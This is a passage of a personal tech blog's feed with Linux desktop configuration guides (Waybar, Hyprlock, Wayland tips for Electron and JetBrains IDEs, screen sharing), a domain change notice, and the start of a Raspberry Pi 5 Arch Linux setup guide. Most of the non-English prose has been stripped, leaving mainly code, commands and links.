class="line">  <span class="string">&quot;custom/left-arrow-dark&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;clock#2&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/right-arrow-dark&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/right-arrow-light&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;clock#3&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/right-arrow-dark&quot;</span></span><br><span class="line"> <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;modules-right&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-dark&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;wireplumber&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-light&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-dark&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;memory&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-light&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-dark&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;cpu&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-light&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-dark&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;battery&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-light&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-dark&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;disk&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-light&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-dark&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;backlight&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-light&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-dark&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;tray&quot;</span></span><br><span class="line"> <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">&quot;custom/left-arrow-dark&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tooltip&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;custom/left-arrow-light&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tooltip&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;custom/right-arrow-dark&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tooltip&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;custom/right-arrow-light&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tooltip&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">&quot;hyprland/workspaces&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;disable-scroll&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;name&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;on-click&quot;</span><span class="punctuation">:</span> <span class="string">&quot;activate&quot;</span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">&quot;clock#1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;:%a&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tooltip&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;clock#2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;:%H:%M&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tooltip&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;clock#3&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;:%m-%d&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tooltip&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">&quot;wireplumber&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;icon&#125; &#123;volume:2&#125;%&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;format-bluetooth&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;icon&#125;  &#123;volume&#125;%&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;format-muted&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MUTE&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;format-icons&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;headphones&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;default&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scroll-step&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;on-click&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pamixer -t&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;on-click-right&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pavucontrol&quot;</span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;memory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;interval&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Mem &#123;&#125;%&quot;</span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;interval&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CPU &#123;usage:2&#125;%&quot;</span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;battery&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;states&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;good&quot;</span><span class="punctuation">:</span> <span class="number">95</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;warning&quot;</span><span class="punctuation">:</span> <span class="number">30</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;critical&quot;</span><span class="punctuation">:</span> <span class="number">15</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;icon&#125; &#123;capacity&#125;%&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;format-icons&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">   <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;disk&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;interval&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Disk &#123;percentage_used:2&#125;%&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line"> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;backlight&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\udb80\udcdf &#123;percent&#125;%&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;scroll-step&quot;</span><span class="punctuation">:</span> <span class="number">5</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;tray&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;icon-size&quot;</span><span class="punctuation">:</span> <span class="number">20</span></span><br><span class="line"> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p> <code>pavucontrol</code> <code>pamixer</code> <br><code>style.css</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line"> <span class="attribute">font-family</span>: monospace;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window<span class="selector-id">#waybar</span> &#123;</span><br><span class="line"> <span class="attribute">background</span>: <span class="number">#292b2e</span>;</span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#fdf6e3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#custom-right-arrow-dark</span>,</span><br><span class="line"><span class="selector-id">#custom-left-arrow-dark</span> &#123;</span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#1a1a1a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#custom-right-arrow-light</span>,</span><br><span class="line"><span class="selector-id">#custom-left-arrow-light</span> &#123;</span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#292b2e</span>;</span><br><span class="line"> <span class="attribute">background</span>: <span class="number">#1a1a1a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#workspaces</span>,</span><br><span class="line"><span class="selector-id">#clock</span>.<span class="number">1</span>,</span><br><span class="line"><span class="selector-id">#clock</span>.<span class="number">2</span>,</span><br><span class="line"><span class="selector-id">#clock</span>.<span class="number">3</span>,</span><br><span class="line"><span class="selector-id">#wireplumber</span>,</span><br><span class="line"><span class="selector-id">#memory</span>,</span><br><span class="line"><span class="selector-id">#cpu</span>,</span><br><span class="line"><span class="selector-id">#battery</span>,</span><br><span class="line"><span class="selector-id">#disk</span>,</span><br><span class="line"><span class="selector-id">#backlight</span>,</span><br><span class="line"><span class="selector-id">#tray</span> &#123;</span><br><span class="line"> <span class="attribute">background</span>: <span class="number">#1a1a1a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#workspaces</span> <span class="selector-tag">button</span> &#123;</span><br><span class="line"> <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">2px</span>;</span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#fdf6e3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#workspaces</span> <span class="selector-tag">button</span><span class="selector-class">.focused</span> &#123;</span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#268bd2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#workspaces</span> <span class="selector-tag">button</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line"> <span class="attribute">box-shadow</span>: inherit;</span><br><span class="line"> <span class="attribute">text-shadow</span>: inherit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#workspaces</span> <span class="selector-tag">button</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line"> <span class="attribute">background</span>: <span class="number">#1a1a1a</span>;</span><br><span class="line"> <span class="attribute">border</span>: <span class="number">#1a1a1a</span>;</span><br><span class="line"> <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#wireplumber</span> &#123;</span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#268bd2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#memory</span> &#123;</span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#2aa198</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#cpu</span> &#123;</span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#6c71c4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#battery</span> &#123;</span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#859900</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#disk</span> &#123;</span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#b58900</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#clock</span>,</span><br><span class="line"><span class="selector-id">#wireplumber</span>,</span><br><span class="line"><span class="selector-id">#memory</span>,</span><br><span class="line"><span class="selector-id">#cpu</span>,</span><br><span class="line"><span class="selector-id">#battery</span>,</span><br><span class="line"><span class="selector-id">#disk</span>,</span><br><span class="line"><span class="selector-id">#backlight</span>&#123;</span><br><span class="line"> <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>~/.config/waybar</code>  <code>exec-once</code> </p><h3 id="2-8-Hyprlock-screen-Locker"><a href="#2-8-Hyprlock-screen-Locker" class="headerlink" title="2.8 Hyprlock - screen Locker"></a>2.8 Hyprlock - screen Locker</h3><ol start="0"><li> <code>~/.config/hypr/hyprlock.conf</code></li><li> <a href="https://wiki.hyprland.org/Hypr-Ecosystem/hyprlock/">wiki.hyprland.org&#x2F;Hypr-Ecosystem&#x2F;hyprlock</a>  Widgets , </li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">background &#123;</span><br><span class="line">    monitor =</span><br><span class="line">    # path = /home/me/someImage.png   # only png supported for now</span><br><span class="line">    color = rgba(25, 20, 20, 1.0)</span><br><span class="line"></span><br><span class="line">    # all these options are taken from hyprland, see https://wiki.hyprland.org/Configuring/Variables/#blur for explanations</span><br><span class="line">    blur_passes = 0 # 0 disables blurring</span><br><span class="line">    blur_size = 7</span><br><span class="line">    noise = 0.0117</span><br><span class="line">    contrast = 0.8916</span><br><span class="line">    brightness = 0.8172</span><br><span class="line">    vibrancy = 0.1696</span><br><span class="line">    vibrancy_darkness = 0.0</span><br><span class="line">&#125;</span><br><span class="line">input-field &#123;</span><br><span class="line">    monitor =</span><br><span class="line">    size = 200, 50</span><br><span class="line">    outline_thickness = 3</span><br><span class="line">    dots_size = 0.33 # Scale of input-field height, 0.2 - 0.8</span><br><span class="line">    dots_spacing = 0.15 # Scale of dots&#x27; absolute size, 0.0 - 1.0</span><br><span class="line">    dots_center = false</span><br><span class="line">    dots_rounding = -1 # -1 default circle, -2 follow input-field rounding</span><br><span class="line">    outer_color = rgb(151515)</span><br><span class="line">    inner_color = rgb(200, 200, 200)</span><br><span class="line">    font_color = rgb(10, 10, 10)</span><br><span class="line">    fade_on_empty = true</span><br><span class="line">    fade_timeout = 1000 # Milliseconds before fade_on_empty is triggered.</span><br><span class="line">    placeholder_text = &lt;i&gt;Input Password...&lt;/i&gt; # Text rendered in the input box when it&#x27;s empty.</span><br><span class="line">    hide_input = false</span><br><span class="line">    rounding = -1 # -1 means complete rounding (circle/oval)</span><br><span class="line">    check_color = rgb(204, 136, 34)</span><br><span class="line">    fail_color = rgb(204, 34, 34) # if authentication failed, changes outer_color and fail message color</span><br><span class="line">    fail_text = &lt;i&gt;$FAIL &lt;b&gt;($ATTEMPTS)&lt;/b&gt;&lt;/i&gt; # can be set to empty</span><br><span class="line">    fail_transition = 300 # transition time in ms between normal outer_color and fail_color</span><br><span class="line">    capslock_color = -1</span><br><span class="line">    numlock_color = -1</span><br><span class="line">    bothlock_color = -1 # when both locks are active. -1 means don&#x27;t change outer color (same for above)</span><br><span class="line">    invert_numlock = false # change color if numlock is off</span><br><span class="line">    swap_font_color = false # see below</span><br><span class="line"></span><br><span class="line">    position = 0, -20</span><br><span class="line">    halign = center</span><br><span class="line">    valign = center</span><br><span class="line">&#125;</span><br><span class="line">label &#123;</span><br><span class="line">    monitor =</span><br><span class="line">    text = cmd[update:1000] echo &quot;&lt;span foreground=&#x27;blue&#x27;&gt;$(date)&lt;/span&gt; &quot;</span><br><span class="line">    text_align = center # center/right or any value for default left. multi-line text alignment inside label container</span><br><span class="line">    color = rgba(200, 200, 200, 1.0)</span><br><span class="line">    font_size = 25</span><br><span class="line">    font_family = Noto Sans</span><br><span class="line">    rotate = 0 # degrees, counter-clockwise</span><br><span class="line"></span><br><span class="line">    position = 0, 80</span><br><span class="line">    halign = center</span><br><span class="line">    valign = center</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-9-Electron-on-wayland"><a href="#2-9-Electron-on-wayland" class="headerlink" title="2.9 Electron on wayland"></a>2.9 Electron on wayland</h3><blockquote><p> electron </p></blockquote><p>:</p><ul><li><a href="https://fcitx-im.org/wiki/Using_Fcitx_5_on_Wayland#Chromium_.2F_Electron">https://fcitx-im.org/wiki/Using_Fcitx_5_on_Wayland#Chromium_.2F_Electron</a></li><li><a href="https://github.com/fcitx/fcitx5/issues/996">https://github.com/fcitx/fcitx5/issues/996</a></li></ul><ol><li> chromium &#x2F; electron  -&gt;  <code>xeyes</code>  X11 ( <code>xeyes</code>),  wayland .</li><li> <code>export ELECTRON_OZONE_PLATFORM_HINT=wayland</code>  <code>export QT_QPA_PLATFORM=wayland</code>  electron  qt  wayland </li><li> fcitx5  chromium &#x2F; elctron  wayland ,  <code>--enable-features=UseOzonePlatform --ozone-platform=wayland --enable-wayland-ime</code> ,  chrome  vscode</li></ol><h3 id="2-10-Screen-sharing"><a href="#2-10-Screen-sharing" class="headerlink" title="2.10 Screen sharing"></a>2.10 Screen sharing</h3><blockquote><p></p></blockquote><p>:</p><ul><li>1: <a href="https://wiki.hyprland.org/Useful-Utilities/Screen-Sharing/">https://wiki.hyprland.org/Useful-Utilities/Screen-Sharing/</a></li><li>2: <a href="https://wiki.hyprland.org/Useful-Utilities/Screen-Sharing/">https://wiki.hyprland.org/Useful-Utilities/Screen-Sharing/</a>  <a href="https://gist.github.com/brunoanc/2dea6ddf6974ba4e5d26c3139ffb7580">https://gist.github.com/brunoanc/2dea6ddf6974ba4e5d26c3139ffb7580</a></li><li><a href="https://github.com/hyprwm/xdg-desktop-portal-hyprland/issues/104">https://github.com/hyprwm/xdg-desktop-portal-hyprland/issues/104</a></li></ul><ol><li>1 <code>pipewire</code>  <code>wireplumber</code> , 2 <code>xdg-desktop-portal-hyprland</code>( <code>xdg-desktop-portal-wlr</code> ).</li><li>2 <code>exec-once=dbus-update-activation-environment --systemd WAYLAND_DISPLAY XDG_CURRENT_DESKTOP</code>  <code>hyprland.conf</code> </li></ol><h3 id="2-11--KDE-"><a href="#2-11--KDE-" class="headerlink" title="2.11  KDE "></a>2.11  KDE </h3><blockquote><p> KDE </p></blockquote><p>: <a href="https://www.lorenzobettini.it/2024/05/fixing-the-empty-open-with-in-dolphin-in-hyprland/">https://www.lorenzobettini.it/2024/05/fixing-the-empty-open-with-in-dolphin-in-hyprland/</a></p><ol><li> <code>sudo pacman -S archlinux-xdg-menu</code></li><li> <code>env = XDG_MENU_PREFIX,arch-</code>  <code>hyprland.conf</code></li></ol><h3 id="2-12-Jetbrain-IDEs-in-wayland"><a href="#2-12-Jetbrain-IDEs-in-wayland" class="headerlink" title="2.12 Jetbrain IDEs in wayland"></a>2.12 Jetbrain IDEs in wayland</h3><blockquote><p> <code>wayland</code>  Jetbrain IDEs  </p></blockquote><p>:</p><ul><li><a href="https://youtrack.jetbrains.com/issue/JBR-3206/Native-Wayland-support#focus=Comments-27-9266459.0-0">https://youtrack.jetbrains.com/issue/JBR-3206/Native-Wayland-support#focus=Comments-27-9266459.0-0</a></li><li><a href="https://mvysny.github.io/idea-wayland/">https://mvysny.github.io/idea-wayland/</a></li></ul><ol><li> <code>-Dawt.toolkit.name=WLToolkit</code>  <code>help-&gt;custom VM options</code> </li></ol><h3 id="2-13-Line-In"><a href="#2-13-Line-In" class="headerlink" title="2.13 Line In"></a>2.13 Line In</h3><p>&#x2F;playback LineIn ( windows  listern )  <code>pactl load-module module-loopback source=alsa_input.usb-Generic_USB_Audio-00.pro-input-1</code>.<br> source  <code>pactl list short sources</code>  LineIn  sink, .<br> <code>pactl unload-module module-loopback</code></p><h2 id="3-"><a href="#3-" class="headerlink" title="3. "></a>3. </h2><ul><li>Jetbrain IDEs ,  <code>Ctrl shift L</code> (),  <code>enter</code> ,  <code>Super + C</code>  IDE </li><li>Chrome  popup  tab  <code>SUPER</code>  Chrome ok</li></ul>]]></content>
      
      
      <categories>
          
          <category> How-to </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Domain Change Notice</title>
      <link href="/2024/02/17/Domain-change/"/>
      <url>/2024/02/17/Domain-change/</url>
      
        <content type="html"><![CDATA[<p> <code>eritque-arcus.tech</code>(Mar 2021 - Apr 2024)  <code>ikuyo.dev</code>.<br> <code>eritque-arcus@eritque-arcus.tech</code>  <code>eritque-arcus@ikuyo.dev</code>.</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Raspberry Pi 5  Arch Linux</title>
      <link href="/2024/02/09/raspberry-pi5-arch/"/>
      <url>/2024/02/09/raspberry-pi5-arch/</url>
      
        <content type="html"><![CDATA[<blockquote><p> Pimoroni  Nvme SSD ,  Arch<br> Micro HDMI  SSD ,  usb boot , Headless</p></blockquote><h2 id="0-"><a href="#0-" class="headerlink" title="0. "></a>0. </h2><ul><li>Raspberry Pi 5</li><li>USB</li><li></li><li>PC</li><li>SSD</li></ul><h2 id="1--USB-Boot"><a href="#1--USB-Boot" class="headerlink" title="1.  USB Boot"></a>1.  USB Boot</h2><p> <code>sudo pacman -S rpi-imager</code>  <code>rpi-imager</code>  USB  <code>Raspberry OS</code>  SSH </p><h2 id="2-USB-Boot-"><a href="#2-USB-Boot-" class="headerlink" title="2. USB Boot "></a>2. USB Boot </h2><ol start="0"><li> USB  Pi 5 </li><li> Pi  PC,  <code>share with other computer</code> <img src="/images/rpi5-arch1.png" alt="share with other computer option"></li><li> <code>ip a</code>  PC  ip  <code>10.42.0.1</code>,  <code>nmap -sn 10.42.0.0/24</code>( <code>nmap</code> )  Pi  ip ( <code>10.42.0.83</code>)<br><img src="/images/rpi5-arch2.png" alt="ip a"><br><img src="/images/rpi5-arch3.png" alt="nmap"></li><li><code>ssh alarm@10.42.0.83</code> </li><li><code>sudo apt-get update &amp;&amp; sudo apt-get upgrade</code> <br> <code>dhcpcd</code>, <code>iptable</code> </li><li><code>sudo rpi-eeprom-config -e</code>  <code>BOOT_ORDER</code>,  <code>BOOT_ORDER=0xf64</code>  <code>USB</code> (<code>4</code>)  <code>nvme</code> (<code>6</code>)  (<code>f</code>). <a 